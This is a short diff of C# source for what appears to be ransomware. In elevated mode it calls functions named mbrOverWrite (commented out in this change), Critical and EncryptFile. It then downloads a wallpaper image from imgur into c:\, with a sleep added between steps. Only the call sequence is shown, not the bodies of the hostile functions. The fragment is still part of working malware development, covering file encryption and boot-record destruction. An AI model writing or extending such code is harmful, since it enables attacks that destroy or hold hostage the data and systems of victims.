@@ -277,8 +277,9 @@ namespace Program
         {
             if (IsElevated == true)
             {
-                mbrOverWrite();
+                // mbrOverWrite();
                 Critical();
+                Thread.Sleep(200);
                 EncryptFile(); // Calls the file encryption function
                 new WebClient().DownloadFile("https://i.imgur.com/wAvU1Km.jpg", @"c:\wAvU1Km.jpg"); // Downloads the picture we want as wallpaper and places it in the c:\ directory
                 Thread.Sleep(2000);
